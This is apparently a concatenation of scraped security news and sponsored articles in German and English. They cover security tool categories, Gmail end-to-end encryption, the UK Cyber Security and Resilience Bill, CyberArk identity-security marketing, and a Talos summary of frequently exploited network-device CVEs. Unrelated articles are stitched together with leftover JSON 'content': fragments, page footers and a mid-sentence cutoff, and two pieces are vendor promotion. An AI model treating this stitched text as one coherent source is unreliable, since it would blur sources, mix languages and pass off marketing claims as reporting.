Lösungen können On-Premises oder in der Cloud eingesetzt werden und „sitzen“ zwischen Cloud-Dienstanbieter und Benutzer.\nDas ermöglicht eine ganze Reihe von Sicherheitsverfahren mit Blick auf Authentifizierung, Autorisierung und Malware-Abwehr. Hinzu kommen zahlreiche neue, KI-basierte Features, die Unternehmen dabei unterstützen,\nSaaS-Anwendungen\nund -Daten abzusichern und Compliance-Vorgaben zu erfüllen. Darüber hinaus sind CASB-Lösungen auch hilfreich, um Identitäten und Authentifizierungs-Prozesse über mehrere Cloud-Anwendungen hinweg zu managen.\n9.\nAnti-Malware-Tools\nAnti-Malware-Software wird oft mit Antivirus-Lösungen gleichgesetzt, allerdings unterscheiden sich diese Kategorien funktional. Denn Anti-Malware-Produkte schützen nicht nur vor Viren und Würmern, sondern auch vor anderen Threats wie Spyware, Ransomware, und\nTrojanern\n. Inzwischen haben Anti-Malware-Tools der Enterprise-Klasse eigenständige Antivirus-Angebote weitgehend ersetzt.\nDas macht auch Sinn, denn\nklassische Computerviren\nsind längst nicht mehr die größte Bedrohung für Unternehmen, auch wenn sie lästig sein können. Cryptomining und insbesondere Ransomware machen inzwischen den Großteil der Angriffe aus, die auf Client-Ebene durch Malware initiiert werden.\n10.\nMobile Threat Defense\nUm mobile Devices vor Cyberangriffen und Datenverlust zu schützen, sollten im Enterprise-Umfeld Tools aus der Kategorie Mobile Threat Defense eingesetzt werden. Laut den Analysten von Gartner definiert sich diese Produktkategorie dadurch, dass sie mobile Geräte auf Anwendungs-, Netzwerk- und Device-Ebene schützen kann.\nFür so gut wie alle Unternehmen stellt es eine Herausforderung dar, Mobilgeräte zu managen – egal, ob es dabei um Unternehmens- oder Privatgeräte geht. Lösungen aus dem Bereich Enterprise Mobility Management (\nEMM\n) oder Mobile Device Management (\nMDM\n)-Angebot verfügen oft nicht über die nötigen Detection- und Prevention-Funktionen, um Mobile-Bedrohungen den Wind aus den Segeln zu nehmen.\n11.\nBackup und Disaster Recovery\nLösungen im Bereich Backup und Disaster Recovery sind im Unternehmensumfeld bekanntermaßen Pflicht. Sie stehen in zahlreichen Ausformungen zur Verfügung, beispielsweise auf lokaler Ebene, über die Cloud oder als Air-Gapped-Lösungen. Unerlässlich ist diese Tool-Kategorie beispielsweise, um Daten nach einem Ransomware-Angriff sicher wiederherstellen zu können.\nSogenannte Bare-Metal-Restores (BMRs) aus der Cloud sind dabei unter Umständen für manche Unternehmen noch Neuland. Diese Lösungen sind dem Umstand geschuldet, dass Geschwindigkeit ein wichtiger Faktor ist, wenn es um die Recovery geht. Diesbezüglich haben sich Cloud-basierte BMRs in den vergangenen Jahren erheblich weiterentwickelt. Auch sichere, verschlüsselte Backups sind inzwischen ein Faktor, um eine Cyberversicherungspolice in Anspruch nehmen zu können.\n12.\nIncident Response\nIncident-Response-Systeme sind von entscheidender Bedeutung, um Data Breaches zu erkennen und zu gewährleisten, dass bei der Reaktion auf Sicherheitsvorfälle vorab definierte Prozesse in Kraft treten, um Daten zu schützen, Informationen für die\nIT-Forensik\nzu bewahren und alle relevanten Stakeholder informiert zu halten. Und zwar in der richtigen Reihenfolge.\nSysteme dieser Art können – je nach Branche – erforderlich sein, um Compliance-Regelungen zu erfüllen. Auch mit Blick auf Cyberversicherungen werden Incident-Response-Lösungen oft vorausgesetzt.\n13.\nAI-SPM\nGetrieben vom weiterhin um sich greifenden KI-Hype wollen diverse Unternehmen die Technologie möglichst schnell implementieren – und verzichten dafür darauf, ihre Initiativen mit einer sicherheitstechnisch stabilen Grundlage auszustatten. Das setzt das Unternehmen und seine Daten\nneuen Schwachstellen und Bedrohungen aus\n. Diese adressiert die Tool-Kategorie AI Security Posture Management – kurz AI-SPM.\nAI Security Posture Management konzentriert sich darauf, die Integrität und Sicherheit von KI- und ML-Systemen zu gewährleisten. Dabei umfasst AI-SPM Strategien, Tools und Techniken, um Daten, Pipelines, Applikationen und Services mit Blick auf ihre Sicherheitslage zu überwachen, zu bewerten und zu optimieren. Das kann beispielsweise verhindern, dass sensible Daten in KI-Modelle einfließen oder gewährleisten, Governance-Richtlinien für Business-Anwender durchzusetzen.

        "content": "The new encryption system doesn’t require external exchange of keys or complex user certificate management\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tStephen Phillips\nGoogle has introduced a new end-to-end encryption (E2EE) feature in Gmail, enabling organizations to send encrypted emails that even Google cannot read to other Gmail users. Later this year, the feature will be expanded to allow the sending of encrypted emails to any email users, including those from other providers.\nE2EE differs from encrypting email communication in transit between email servers, which is already achieved with\nTLS\n(transport layer security), or at rest when stored in Google’s data centers. E2EE allows users to encrypt sent messages in a way that only the intended recipients can decrypt and read them.\nHow end-to-end encryption works\nE2EE for email is typically achieved with Secure/Multipurpose Internet Mail Extensions (S/MIME), a public protocol and standard that uses public-key cryptography to sign and encrypt messages. However, implementing S/MIME is not straightforward, usually involving digital certificate acquisition and management for every user. Additionally, it only works with recipients who also have S/MIME configured.\nThere are proprietary solutions for end-to-end encryption that involve deploying additional software, browser extensions, or web portals. Organizations in certain regulated industry sectors, including government agencies, typically go through the trouble of setting up such E2EE solutions for sensitive emails, but most other organizations avoid them due to usability issues.\n“These gaps and challenges have created real friction for both IT teams and users for decades,” Johney Burke, senior product manager at Google Workspace, told CSO. “Organizations resolve these issues either through incredibly intricate and expensive IT management or by minimizing communications with entities outside their company. Neither is a satisfactory option.”\nGoogle creates new email encryption model\nGoogle took a different approach and created a new model that no longer requires complex user certificate management or exchanging keys with external organizations to decrypt messages.\nGoogle’s new E2EE Gmail implementation\nrelies on the existing\nclient-side encryption (CSE) feature in Google Workspace\n, which allows customers to use their own encryption keys to encrypt files and emails on the client-side before they are stored on Google’s servers. This feature allows organizations to control the identity provider used to grant access to the encryption keys and the third-party key management service used to store them.\nIn its new integration with Gmail, currently available in beta, customers can choose from the regular Gmail message compose web interface if they want to encrypt the message. For now, the feature only works between Gmail users who are members of the same organization, but over the coming weeks, it will be enabled for all Gmail recipients, both enterprise and personal accounts.\nLater this year, when the feature is fully implemented, Workspace users with E2EE enabled will be able to send encrypted messages to any external email users. Instead of the message, recipients will receive a link that, when clicked, will take them to a restricted version of Gmail where they need to authenticate with the organization’s chosen identity provider to view the decrypted message. External users will also be able to reply within the same restricted Gmail interface.\nRestricted view allows for more control\nBy default, Gmail users won’t have to go through this restricted Gmail experience, and emails will automatically decrypt when they arrive in their inbox if they are the intended recipients. However, administrators can choose to enforce the restricted Gmail view for everyone, including Gmail users, to ensure sensitive communications are not downloaded locally on third-party servers or devices.\nBecause this option requires authentication with an approved account and identity provider, organizations can easily revoke access and apply additional security policies. Google describes this experience as similar to a shared document stored in Google Drive.\n“At a structural level, this approach offers more comprehensive encryption protection,” Julien Duplant, product manager at Google Workspace, told CSO. “It doesn’t matter who you send a message to or what email they are using; your message will be encrypted, and you are in sole control. There’s just one set of keys, and you’re the only one who has them.”\nRelated content\nNews\nResearchers claim their protocol can create truly random numbers on a current quantum computer\nBy\nHoward Solomon\n27 Mar 2025\n5 mins\nEncryption\nSecurity\nFeature\n7 cutting-edge encryption techniques for reimagining data security\nBy\nPeter Wayner\n27 Mar 2025\n8 mins\nData and Information Security\nEncryption\nFeature\n11 ways cybercriminals are making phishing more potent than ever\nBy\nJohn Leyden\n25 Mar 2025\n12 mins\nEmail Security\nPhishing\nSocial Engineering\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "Government will bring more managed service and data center providers under regulation to tighten cybersecurity.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShutterstock\nIf you’re a UK enterprise, this might not be good news: extra investment by infrastructure providers to meet the demands of the government’s forthcoming Cyber Security and Resilience Bill is likely to raise the cost of some services.\nThis looks like the inevitable outcome of a bill, previewed in a policy statement by the government this week, which will affect a wide tranche of infrastructure companies for the first time. This includes, by the government’s own estimates, up to an additional 1,100 managed service providers, 64 data center operators, and an unspecified number of smaller companies in the digital supply chain.\nThe government acknowledges that, if implemented in full, this will impose new costs, which means that the business customers using those providers will face higher bills at some point.\nMany of these providers are not currently subject to existing cybersecurity legislation governing critical national infrastructure, primarily the Network and Information Systems Regulations 2018 (UK). The new legislation will bring the UK more into line with the regulation’s EU successor,\nNIS2\n.\n“While we expect this measure to have associated costs related to security improvements and compliance, these investments will position MSPs as trusted and reliable partners in the cyber security landscape,” the\ngovernment’s policy statement said\n.\nWhat will the bill change?\nAs well as broader oversight, the bill will impose tougher reporting requirements, requiring companies to notify the UK’s National Cyber Security Centre (NCSC) of a significant incident within 24 hours. The definition of ‘significant’ will include anything compromising data, as well as, significantly, supply chain attacks affecting customers (\nstand up Snowflake\n).\nThe emphasis on resilience means that providers will have to explain how they would recover from an incident and not simply avoid it. The new regulator of all this, the Information Commissioner’s Office (ICO), will be given teeth, the government indicated. That will mean the ICO will need more resources to meet this expanded, and in many ways, daunting remit.\nWhat this means for enterprises is that the service providers, and probably major data center operators, will have to operate to more consistent standards. Broadly, this is positive, although many will already be working towards those standards under the influence of NIS2 regulations.\nWhy is it needed?\nIn 2024, the NCSC responded to 430 cybersecurity incidents, including 89 it said were rated as “nationally significant.” That included the large\nransomware attack\non the NHS pathology services provider Synnovis last June that ended up costing an estimated £32.7 million ($42 million) to fix.\n“Last year’s cyber attack on a supplier to NHS hospitals in London caused more than 11,000 acute outpatient appointments and elective procedures to be postponed. Some of those people will have waited months to be seen,” said the Secretary of State for the Department for Science, Innovation and Technology, Peter Kyle. “I will not allow this to continue. We must take decisive action to deliver effective and enduring change.”\nAnd this isn’t just a problem for the public sector; last year’s\nCyber Security Breaches Survey\nfound that half of UK businesses suffered some form of cyberattack in the last 12 months, equivalent to seven million incidents.\nTo illustrate the peril, the government pointed out that a hypothetical cyber attack directed at an energy company in the southeast of England could “wipe over £49 billion [$63 billion] from the wider UK economy.”\nPutting a lid on this kind of disruption requires legislation to compel providers to act, while offering a target to aim for in terms of compliance.\nThe full demands of the bill have yet to be revealed. Right now, all that affected organizations know is its general outline and broad scope. When it is published in full, the detail will be pored over at length.\n“One of the key announcements is the introduction of MSPs falling into the scope of the regulation. Small and medium sized enterprises depend on managed service providers for every aspect of their IT and their security posture,” said David Ferbrache, managing director of UK technology consultancy Beyond Blue. “Making sure MSPs take security seriously can make a massive difference to those SMEs.”\nHowever, Ferbrache was less sure about the new role given to the ICO as regulator. “The extension of the role of the ICO to regulate a wide range of digital services is a major change in scope. Care will be needed to not create conflicts of interest or distract from their key role as our national data protection authority,” he said.\nRelated content\nBrandpost\nSponsored by Fortinet\nThreat-informed defense for operational technology: Moving from information to action\nBy\nDerek Manky, chief security strategist and global VP of threat intelligence\n02 Apr 2025\n7 mins\nSecurity\nNews\nMicrosoft’s AI tool catches critical GRUB2, U-boot bootloader flaws\nBy\nGyana Swain\n02 Apr 2025\n6 mins\nGenerative AI\nSecurity\nVulnerabilities\nNews\nGoogle fixes GCP flaw that could expose sensitive container images\nBy\nShweta Sharma\n02 Apr 2025\n3 mins\nCloud Security\nSecurity\nVulnerabilities\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

With\nmachine identities\nnow far outnumbering human ones, securing these digital credentials has become a top cybersecurity priority for enterprises. However, as the CyberArk\n2025 State of Machine Identity Security Report\nshows, many of the 1,200 security leaders in organizations we surveyed—across the U.S., U.K., Australia, France, Germany, and Singapore—are struggling to effectively manage their machine identities, exposing them to significant risks.\nMachine identities—unique digital credentials, such as TLS certificates, used by devices, applications, APIs, and cloud-native technologies—are critical for secure communication in modern systems. Yet their explosive growth, high turnover, and susceptibility to compromise drive complexity and increase risks for organizations.\nThe report’s findings reveal the challenges organizations face and how prepared organizations feel to address these machine identity risks. Here, we’ll explore the growth of machine identities, the associated risks, and the strategies organizations can adopt to help mitigate these challenges.\nThe growth of machine identities and the associated risks\nMachine identities are experiencing exponential growth, with 79% of organizations predicting increases over the next year and 16% of those expecting radical growth of 50 to 150%. Cloud-native technologies, microservices, and artificial intelligence (AI) drive this surge because they’re environments where identities are created and discarded dynamically in minutes.\nUnfortunately, this growth comes with amplified risks. Half of the surveyed organizations experienced security breaches tied to compromised machine identities within the past year.\nThese incidents caused widespread impacts, including:\n51% faced delays in application launches,\nstalling production timelines.\n44% reported outages,\ndamaging customer experiences.\n43% experienced unauthorized access\nto sensitive systems or data.\nCybercriminals are increasingly targeting machine identities, such as API keys and SSL/TLS certificates, which were leading causes of incidents; each were exploited in 34% of cases. These highly vulnerable identity types are becoming prime entry points for attackers.\nChallenges in securing machine identities\nOrganizations are contending with numerous obstacles in safeguarding their machine identities. Among the most significant challenges highlighted in the report are:\nUnder-management:\nA staggering 77% of leaders believe every undiscovered machine identity is a potential vulnerability. Poor visibility further exacerbates this situation.\nSiloed ownership:\nWith roles divided between security (53%), development (28%), and platform (14%) teams, fragmented management leads to inefficiencies and gaps in protection.\nChanging lifecycles:\nAs credentials become more short-lived, 37% of leaders report difficulty keeping up with their accelerated renewal and rotation requirements.\nCloud-native complexity:\nThe dynamic nature of cloud environments adds singular challenges. The vast majority (74%) of security leaders are concerned about managing identities in these ephemeral workloads.\nUnderstanding the consequences of certificate-related outages\nAnother pressing issue involves certificate-related outages, which impacted 72% of organizations in the previous 12 months. These outages resulted in business-critical system failures, customer dissatisfaction and compliance challenges. With 45% of teams reporting outages weekly—up from just 12% in 2022—the urgency to address this issue is evident.\nAutomating certificate lifecycle management is essential to securing machine identities and preventing certificate-related outages. Yet, a surprising 34% of organizations continue to rely on manual processes, leaving them vulnerable to operational disruptions and delayed response times. By automating processes such as certificate rotation, renewal and revocation, organizations can reduce risks tied to expired credentials, improve visibility and scale their management capabilities.\nAI’s role in the rising threat landscape\nArtificial intelligence has brought tremendous innovation, but it also demands stronger machine identity protections. AI systems, such as generative AI and agentic AI, rely on machine identities to prevent unauthorized access, manipulation, or hijacking.\nEighty-one percent of security leaders identify machine identity security as vital for safeguarding AI. With threats rising, 72% of organizations expect priorities to shift toward directly protecting AI models from compromise. Machine identity solutions are also increasingly critical for securing assets such as large language models (LLMs), which require robust layers of protection to prevent exploitation.\nPreparing for future challenges in machine identity security\nLooking ahead, organizations face even more daunting challenges, including quantum computing and certificate authority (CA) distrust events.\nQuantum computing threats:\nOver 57% of leaders acknowledge quantum computing’s threat to encryption, yet 30% of organizations are unprepared to begin transitioning to quantum-resistant cryptography.\nCertificate authority (CA) distrust events:\n71% of leaders fear their certificate authority could become untrusted, underscoring the importance of crypto-agile strategies.\nShortened certificate lifespans:\nThe anticipated reduction of public TLS certificate lifespans to 47 days by 2028 means nine times more rotations will be required. Teams must adopt automation solutions to maintain security without hindering operational efficiency.\nBuilding a cyber resilient future\nMachine identity security cannot be an afterthought. With machine identities already outnumbering humans and their importance growing, protecting these credentials is critical to enabling secure, innovative operations.\nBy using automation, enhancing visibility and preparing for emerging challenges like quantum computing, organizations can help safeguard their critical systems and scale with confidence. The time to act is now—machine identity security is not just a technical requirement; it’s a business imperative for resilience and growth.\nCheck out the full report to see how your organization’s machine identity security challenges compare to those of your peers.\nRelated content\nBrandpost\nSponsored by CyberArk\nCIO POV: Building resilience in a complex threat landscape\nBy\nOmer Grossman, Global Chief Information Officer at CyberArk\n16 Jul 2024\n7 mins\nSecurity\nBrandpost\nSponsored by CyberArk\nIdentity security: The keystone of trust\nBy\nClaudio Neiva, CyberArk’s Field Technology Director (LATAM), PAM and Identity Security\n09 Jul 2024\n8 mins\nSecurity\nBrandpost\nSponsored by CyberArk\nWhy identity security Is essential to cybersecurity strategy\nBy\nClaudio Neiva, CyberArk’s Field Technology Director (LATAM), PAM and Identity Security\n24 Jun 2024\n6 mins\nCybercrime\nBrandpost\nSponsored by CyberArk\nUnderstanding APIs and how attackers abuse them to steal data\nBy\nJohn Walsh, senior product marketing manager at CyberArk\n24 Jun 2024\n5 mins\nCybercrime\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "This post aims to provide security leaders with the essential insights needed to actively engage in identity-related architecture and strategy decisions.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShutterstock\nAI is the best thing that’s ever happened to cybercriminals. It allows them to weaponize trust and launch identity-based attacks with staggering scale and sophistication. I’m talking about mutating polymorphic malware, prolonged ransomware sneak attacks that lead to double-extortion and deepfakes that defraud victims every few minutes.\nCISOs must adapt to this reality by implementing zero trust strategies that focus heavily on identity. This transition isn’t always easy because, historically, CISOs delegated identity-related matters to Identity and Access Management (IAM) teams, viewing it primarily as a check-box compliance exercise. Now that identity security has become so crucial to the success (or failure) of an organization’s overall cybersecurity strategy, CISOs must have a solid executive understanding of its role in protecting the enterprise.\nThis post aims to provide security leaders with the essential insights needed to actively engage in identity-related architecture and strategy decisions.\nIdentity: The decision point\nPerimeter-based security models built to keep attackers out won’t work when\n60% of breaches\nnow involve valid credentials. As my colleague Andy Thompson says, “It’s much easier to log in than hack in.”\nEvery entity (human or non-human) accessing a resource (applications, data or other entities) requires an identity. That’s why identities are so valuable. Attackers can target them instead of sniffing out vulnerabilities or deploying malware to exfiltrate sensitive data—tactics that take time and effort. With valid credentials linked to a human or machine identity, attackers can slip in, bypass security controls and operate undetected—sometimes for extended periods—without anyone knowing.\nIn more good news for the bad guys, identities are everywhere. The average staff member has\nmore than 30 digital identities\n, and the total of non-human (or machine) identities outnumbers human identities by as much as 45-to-1. That number keeps growing: the average organization expects identities to surge by\n3x\nin the next 12 months. Given this, it’s unsurprising that 93% of organizations have experienced at least two identity-related breaches.\nThis data helps explain why identity has replaced the perimeter and become the only common decision point from which to evaluate risk and apply dynamic security controls. It also shows why protecting identities is now a core cybersecurity priority.\nIdentity security: A business enabler\nMature organizations understand that structured processes enable automation, which is key to securing identities. For example, HR can automatically create digital identities for new employees, ensuring they receive only the minimum necessary permissions for their role through the use of lifecycle management within identity governance.\nThis automated identity lifecycle is governed by identity security control planes, which ensure that access requests, privilege escalations and governance are managed securely.\nUnlike process-heavy IAM systems of the past, identity security serves as a business enabler by optimizing workflows, decreasing friction and minimizing disruptions. CISOs can effectively communicate identity security’s value to stakeholders and align security efforts with business goals by understanding these identity-related controls organized into three pillars.\nThe three core pillars of identity security\n1. Privilege controls\nExcessive privileges are a top target for cyberattacks and a major cause of security breaches. An effective zero trust approach encompasses four key privilege controls that, together, reduce operational risks associated with unauthorized privileged access:\nLeast privilege access\n– ensuring accounts only have the permissions they need.\nSecrets management\n– securing credentials and API keys.\nJust-in-time (JIT) access\n– granting elevated access only when necessary.\nZero standing privileges (ZSP)\n– eliminating persistent admin rights.\n2. Access management\nManaging and securing access in a decentralized IT environment requires a complementary set of controls, including:\nAdaptive authentication\n– dynamically adjusting access controls based on risk.\nSingle sign-on (SSO)\n– improving user experience and reducing attack surfaces.\nMulti-factor authentication (MFA)\n– adding extra layers of security beyond passwords.\n3. Identity governance\nIdentity governance is all about ensuring visibility, compliance and overall risk reduction by:\nDefining\nwho has access to what, when, and why\n.\nAutomating access reviews and certification processes.\nImplementing\nrole-based and attribute-based access controls\n(RBAC and ABAC).\nTogether, these comprise a holistic identity security architecture. It shifts cybersecurity away from outdated perimeter-based controls toward dynamic, scalable and risk-adaptive access. With this as a foundation, organizations can be consistent about security across all entities (users, devices, applications, and services), make real time risk assessments so they can detect and respond to threats as they emerge, and continuously verify identities and access permissions to enforce zero trust.\nPrioritizing identity security: A CISO’s roadmap\nOf course, implementing these identity controls isn’t something that happens overnight. It’s a journey. The best way to maximize business resilience is to create and then follow a high-level roadmap for orchestrating identity security controls.\nHaving a roadmap in place is not just crucial for goal setting and business justification; it’s also essential for identifying dependencies to ensure that controls work together in harmony. A structured identity-first strategy keeps the big picture in focus. Instead of constantly fighting fires and making tactical fixes, teams can concentrate on building a sustainable, outcome-based security program.\nAI-driven threats are evolving faster than ever before. The vast majority of CISOs have embraced Zero Trust as a philosophy, and as part of that, they approach security as if their organizations have already been breached. With continuous and adaptive identity security, it doesn’t matter whether the attacker is inside or outside. What matters is that they will be stopped in time and shut down before it’s too late. This advantage deserves every CISO’s full attention.\nDownload “The Identity Security Imperative”\nfor insights on how to implement identity security using practical and proven strategies to stay ahead of advanced and emerging threats.\nRelated content\nBrandpost\nSponsored by CyberArk\nCIO POV: Building resilience in a complex threat landscape\nBy\nOmer Grossman, Global Chief Information Officer at CyberArk\n16 Jul 2024\n7 mins\nSecurity\nBrandpost\nSponsored by CyberArk\nIdentity security: The keystone of trust\nBy\nClaudio Neiva, CyberArk’s Field Technology Director (LATAM), PAM and Identity Security\n09 Jul 2024\n8 mins\nSecurity\nBrandpost\nSponsored by CyberArk\nWhy identity security Is essential to cybersecurity strategy\nBy\nClaudio Neiva, CyberArk’s Field Technology Director (LATAM), PAM and Identity Security\n24 Jun 2024\n6 mins\nCybercrime\nBrandpost\nSponsored by CyberArk\nUnderstanding APIs and how attackers abuse them to steal data\nBy\nJohn Walsh, senior product marketing manager at CyberArk\n24 Jun 2024\n5 mins\nCybercrime\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "Eine Studie legt nahe, dass veraltete Netzgeräte ein massives Problem für die Cybersicherheit darstellen und schnellstmöglich ersetzt werden sollten.\nSchwachstellen in alten Netzwerkgeräten stellen ein erhebliches Sicherheitsrisiko für Unternehmen dar.\nSeventyFour – shutterstock.com\nEine\nAnalyse von Ciscos Threat-Intelligence-Team Talos\nzeigt, zwei der drei häufigsten Schwachstellen, auf die es Angreifer im Jahr 2024 abgesehen hatten, waren in alten Netzwerkgeräten zu finden. Das Problem ist, dass Hersteller dazu keine Patches mehr herausgeben.\n„Dies unterstreicht, wie wichtig es ist, veraltete Komponenten des Netzwerks einer Organisation so schnell wie möglich außer Betrieb zu nehmen und zu ersetzen“, betonen die Security-Forscher. Die Studie offenbart: Die beiden Sicherheitslücken – CVE-2024-3273 und CVE-2024-3272 in netzwerkgebundenen Speichergeräten von D-Link, in Kombination mit einer dritten (CVE-2024-24919) in den Quantum Security Gateways von Check Point Software – machten mehr als die Hälfte der Schwachstellen bei Netzwerkgeräten aus, die von Bedrohungsakteuren im vergangenen Jahr missbraucht wurden.\n„Viele dieser Schwachstellen wurden größtenteils von bekannten Botnets wie\nMirai\nund Gafgyt ausgenutzt. Diese übernehmen die Kontrolle über die kompromittierten Geräte und weisen sie an, verteilte Denial-of-Service-Angriffe (\nDDoS\n) und andere böswillige Aktivitäten auszuführen“, heißt es in dem Bericht. Demnach wurden einige Lücken von Ransomware-Betreibern ausgenutzt.\n„Aufgrund des Zugriffs, den Router, Firewalls und andere Netzwerkgeräte bieten, kann ein Angreifer durch deren Kompromittierung leicht lateral vorgehen, andere Phasen seiner Angriffe ausführen und ganze Netzwerke übernehmen“, erklären die Analysten.\nWeitere Schwachstellen auf der Top-10-Liste waren:\nCVE-2023-1389, eine Schwachstelle im TP-Link Archer AX21-Router;\nCVE-2024-3400, eine Lücke im Palo Alto Networks PAN-OS-Firewall-Betriebssystem;\nCVE-2023-36845, eine Schwachstelle im Juniper Networks Junos OS-Betriebssystem;\nCVE-2021-44529, eine Schwachstelle in der Ivanti Endpoint Manager Cloud Service Appliance;\nCVE-2023-38035, eine Sicherheitslücke im Ivanti Sentry Security Gateway;\nCVE-2024-36401, eine Schwachstelle in OSGeo GeoServer;\nCVE-2024-0012, eine Schwachstelle im Betriebssystem PAN-OS von Palo Alto Networks.\nAngriffe auf alte Schwachstellen immer noch beliebt\nViele Bedrohungsakteure profitieren immer noch davon, in Netzwerke über alte und ungepatchte Lücken einzudringen. Dem Bericht zufolge wurden vier der zwölf häufigsten ausgenutzten Schwachstellen (CVEs) vor einem Jahrzehnt veröffentlicht.\nDazu gehören:\nvier Log4j2-Schwachstellen – Anfang 2021 aufgedeckt – die 36 Prozent der am häufigsten angegriffenen Schwachstellen ausmachten;\nvier Schwachstellen in der GNU Bash-Sprache – bekannt geworden im Jahr 2014 – die 31 Prozent der am häufigsten angegriffenen Schwachstellen ausmachten. Bash ist eine gängige Befehlszeilen-Shell, die in vielen Linux- und UNIX-Systemen sowie älteren MacOS-Versionen verwendet wird. Diese Gruppe von offenen Flanken wird zusammenfassend als ShellShock bezeichnet;\nzwei Schwachstellen in der PHP-Sprache – von denen eine im Jahr 2017 und die andere im vergangenen Jahr bekannt wurde – die 17 Prozent der am häufigsten angegriffenen Schwachstellen ausmachten.\n„Dabei handelt es sich jedoch um Schwachstellen, die am häufigsten bei Versuchen ausgenutzt werden. Das ist kein Maß dafür, welche Angriffe tatsächlich erfolgreich waren“, betonen die Studienautoren. Dennoch zeigten diese Zahlen deutlich, dass Bedrohungsakteure häufig ungepatchte Systeme ins Visier nehmen. „Organisationen, die es versäumen, Sicherheitsupdates zu installieren, sind anfälliger Attacken, die verhindert werden könnten.“\nDiese Schlussfolgerung deckt sich weitgehend mit den Erkenntnissen, die das SANS Institute mit Hilfe seiner Sensoren im Internet Storm Center, das die Anzahl bösartiger Aktivitäten im Internet überwacht. gewonnen hat. „Die Schwachstelle, die derzeit am häufigsten ausgenutzt wird, ist auf den Tag genau zwei Jahre alt (\nCVE-2023-26801\n, eine Schwachstelle in LB-Link-WLAN-Routern), gefolgt von\nCVE-2022-30023\n, einer authentifizierten Befehlseinschleusung in Tenda HG9-Routern“, erläutert Johannes Ullrich, Forschungsdekan des Instituts.\n„DasProblem wird am deutlichsten, wenn man sich ansieht, wie konsistent die Passwörter sind, die Angreifer mit Brute-Force-Methoden zu knacken versuchen“, fügt er hinzu. Diese Schwachstellen-Liste hat sich laut Ulrich in den vergangenen 20 Jahren kaum verändert. „Der Grund dafür ist einfach: Die Leute haben Schwierigkeiten, Patches zu installieren. Insbesondere Heimgeräte und Router werden in der Regel nur durch einen Stromstoß gepatcht, der den Benutzer zum Austausch zwingt“\nRisiko durch Log4j-Lücken könnte andauern\nDie Log4j-Protokollierungsbibliothek von Apache zählt zu den am häufigsten verwendeten Open-Source-Programmen der Welt. „Obwohl die vier Schwachstellen, die zusammen als\nLog4Shell\nbekannt sind, kurz nach ihrer Entdeckung gepatcht wurden, stellen sie ein langfristiges Risiko für Unternehmen dar. Log4j ist tief in der Software-Lieferkette verankert“, mahnt der Talos-Bericht.\nDarüber hinaus sind die Forscher besorgt über PHP. Demnach sind zwischen 75 Prozent und 80 Prozent der weltweit zwei Milliarden Websites auf die Programmiersprache angewiesen. Darunter finden sich auch beliebte Websites wie Facebook und Wikipedia sowie E-Commerce-Plattformen wie Etsy und Shopify.\n„Auch die Shellshock-Schwachstelle ist besorgniserregend, da Bash weltweit in Anwendungen und Systemprozesse integriert ist“, heißt es im Bericht. „Viele Webserver, Router und Internet-of-Things-Geräte (IoT) sind auf Bash angewiesen, um Befehle auszuführen. Das bedeutet, dass anfällige Geräte, die mit dem Internet verbunden sind, potenzielle Ziele sind.“\nDiese Hardwarekomponenten würden in der Regel seltener aktualisiert oder seien schwieriger zu patchen, insbesondere in industriellen oder kritischen Infrastrukturen, heißt es weiter. „Die direkten Folgen von Shellshock waren zwar nicht so katastrophal, wie bei anderen hochkarätigen Sicherheitsverletzungen und Cyberangriffen“, räumen die Autoren des Berichts ein, „aber es handelt sich um ein anhaltendes Problem.“\nSo entdeckte Talos beispielsweise 2019 eine globale, staatlich geförderte Spionagekampagne namens „Sea Turtle“, die DNS-Einträge manipulierte, um Zugang zu sensiblen Systemen zu erhalten. Der Angreifer nutzte mehrere Schwachstellen, darunter Shellshock, um sich Zugang zu verschaffen.\n„Obwohl es nur wenige bestätigte Beispiele für staatlich gesponserte Cyberangreifer gibt, die Shellshock ins Visier nehmen, ist es sehr wahrscheinlich, dass andere fortgeschrittene Akteure versucht haben, Shellshock auszunutzen“, schlussfolgern die Bedrohungsspezialisten. „Viele bekannte Gegner, wie die vom russischen Staat gesponserte Gruppe APT28 und die vom nordkoreanischen Staat gesponserte Lazarus-Gruppe, nutzen kritische Schwachstellen in weit verbreiteter Software aus.“\n10 Tipps zur Sicherung von Netzwerkgeräten\nIn dem Bericht empfiehlt Talos folgende Schutzmaßnahmen:\nGeräte „so aggressiv wie möglich“ aktualisieren, einschließlich aktuelle Hardware und Software gegen bekannte Schwachstellen zu patchen sowie vom Hersteller nicht mehr aktualisierte Hand- und Software auszutauschen.\nRobuste Authentifizierungsmethoden samt Multifaktor-Authentifizierung, komplexen Passwörtern und Community-Strings implementieren sowie Standard-Anmeldeinformationen vermeiden.\nBewährte Sicherheitsverfahren befolgen, einschließlich regelmäßiger Updates, Verwaltung von Zugriffskontrollen, Durchführung von Benutzerschulungen und Durchsetzung der Netzwerksegmentierung.\nDen gesamten Überwachungs- und Konfigurationsverkehr verschlüsseln.\nSich über Sicherheitshinweise von Behörden und der Industrie informieren und die vorgeschlagenen Maßnahmen ergreifen, um die darin aufgedeckten Schwachstellen zu beheben.\nSysteme für Anmeldedaten wie TACACS+ und alle Jump-Hosts aktiv sprerren und überwachen.\nKonfigurationen zentral speichern und sie auf Geräte übertragen, anstatt zuzulassen, dass Geräte die vertrauenswürdige 